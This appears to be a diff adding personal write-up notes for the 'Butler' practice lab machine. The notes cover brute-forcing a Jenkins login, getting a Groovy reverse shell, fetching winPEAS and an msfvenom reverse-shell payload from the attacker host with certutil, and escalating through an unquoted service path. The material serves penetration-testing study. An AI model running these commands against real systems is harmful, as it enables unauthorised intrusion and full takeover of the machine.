@@ -1,0 +1,22 @@
+Butler
+- *nmap -T4 -p- -A 192.168.194.131*: reveals port 8080 - a login page
+- BurpSuite login webpage bruteforce:
+	- Burp proxy on -> attempt login -> intercept and send to intruder -> positions tab -> add username and password (highlight, click "add") -> select pitchfork -> payloads tab: payload set 1 - provided some guess usernames, payload set 2 - guess passwords -> start attack
+	- Jenkins : jenkins
+- exploring this logged-in screen, we find 'Manage Jenkins' -> 'Script Console' ("arbitrary Groovy script)
+- a google for Groovy reverse shell gives us the necessary commands to paste into the runable script
+- this gives us a powershell console 
+- we then use sudo python3 http.server 80 as a delivery method for winPEAS (linPEAS for a Windows system)
+	- *certutil.exe -urlcache -f http://192.168.194.130/winpeas.exe winpeas.exe*
+- WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected        
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Administrators [Allow: AllAccess]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [Allow: AllAccess])                                                  
+    In order to optimize system performance, Wise Care 365 will calculate your system startup time.
+	- "unquoted service path" - https://www.rapid7.com/db/modules/exploit/windows/local/unquoted_service_path/
+- we create "malware" to run at C:\Program Files\ with administrator privileges using msfvenom:
+	- *msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.194.130 LPORT=7777 -f exe > Wise.exe*
+	- *certutil -urlcache -f http://192.168.194.130/Wise.exe Wise.exe*
+	- *nc -nvlp 7777*
+- we then stop the WiseBootAssistant process and start it again in order to have our malware run as Admin: *sc stop WiseBootAssistant*
+	- *sc query WiseBootAssistant*
